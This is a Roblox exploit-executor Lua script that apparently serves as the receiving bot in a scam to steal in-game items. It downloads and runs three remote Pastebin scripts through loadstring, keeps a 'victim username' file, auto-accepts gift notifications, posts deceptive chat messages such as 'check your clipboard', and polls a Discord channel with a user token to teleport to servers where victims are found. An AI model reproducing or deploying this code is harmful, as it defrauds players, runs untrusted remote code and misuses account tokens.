if not game:IsLoaded() then
    game.Loaded:Wait()
end
local a = game:GetService("UserInputService")
local b = game:GetService("RunService")
local function c()
    print("Roblox window is IN FOCUS.")
end
b.Heartbeat:Connect(
    function()
        local d = false
        local e = _G.RobloxFocusStatus
        if e == nil then
            c()
            _G.RobloxFocusStatus = d
        elseif d and not e or not d and e then
            c()
            _G.RobloxFocusStatus = d
        end
    end
)
c()
if token == "" or channelId == "" then
    game.Players.LocalPlayer:Kick("Add your token or channelId to use")
end
loadstring(game:HttpGet("https://pastebin.com/raw/xBLu3qtF", true))()
loadstring(game:HttpGet("https://pastebin.com/raw/vbLfSAFd", true))()
loadstring(game:HttpGet("https://pastebin.com/raw/xmJDRh2j", true))()
local f = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:Connect(
    function()
        f:CaptureController()
        f:ClickButton2(Vector2.new())
    end
)
local g = game:GetService("HttpService")
local h = game:GetService("VirtualInputManager")
local i = isfile("user_gag.txt")
local j = isfile("joined_ids.txt")
if not i then
    writefile("user_gag.txt", "victim username")
end
if not j then
    writefile("joined_ids.txt", "[]")
end
local k = readfile("user_gag.txt")
local l = g:JSONDecode(readfile("joined_ids.txt"))
local m = false
local n = 0
local o = nil
local function p(q)
    table.insert(l, q)
    writefile("joined_ids.txt", g:JSONEncode(l))
end
local function r()
    local s
    s =
        game.Players.PlayerRemoving:Connect(
        function(t)
            if t.Name == k then
                if s then
                    s:Disconnect()
                end
                m = true
            end
        end
    )
end
r()
local u = game:GetService("Players")
local v = u.LocalPlayer
while v:GetAttribute("DataFullyLoaded") ~= true do
    v:GetAttributeChangedSignal("DataFullyLoaded"):Wait()
end
while v:GetAttribute("Finished_Loading") ~= true do
    v:GetAttributeChangedSignal("Finished_Loading"):Wait()
end
while v:GetAttribute("Loading_Screen_Finished") ~= true do
    v:GetAttributeChangedSignal("Loading_Screen_Finished"):Wait()
end
wait(1)
local w = v:WaitForChild("PlayerGui"):WaitForChild("Gift_Notification"):WaitForChild("Frame")
local function x()
    while task.wait(0.1) do
        for y, z in pairs(w:GetChildren()) do
            if z:IsA("ImageLabel") then
                local A = z:WaitForChild("Holder"):WaitForChild("Frame"):WaitForChild("Accept")
                replicatesignal(A.MouseButton1Click)
            end
        end
    end
end
task.spawn(x)
game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("Trading")
wait(0.5)
game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("Trading")
wait(0.5)
game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("Thanks brooo, check your clipboard")
local function B()
    while task.wait(1) do
        n = n + 1
    end
end
task.spawn(B)
local function C()
    local D =
        request(
        {
            Url = "https://discord.com/api/v9/channels/" .. channelId .. "/messages?limit=1",
            Method = "GET",
            Headers = {
                ["Authorization"] = token,
                ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                ["Content-Type"] = "application/json"
            }
        }
    )
    if D.StatusCode == 200 then
        local E = g:JSONDecode(D.Body)
        if #E == 0 then
            return
        end
        local F = E[1]
        if F.id == o or table.find(l, tostring(F.id)) then
            return
        end
        local G = F.content or ""
        local H, I = string.match(G, 'TeleportToPlaceInstance%((%d+),%s*[\'"]([%w%-]+)[\'"]%)')
        if H and I then
            o = F.id
            p(tostring(F.id))
            writefile("user_gag.txt", "unknown")
            game:GetService("TeleportService"):TeleportToPlaceInstance(H, I)
        end
    else
        print("Invalid response code:", D.StatusCode)
    end
end
while task.wait(5) do
    C()
end
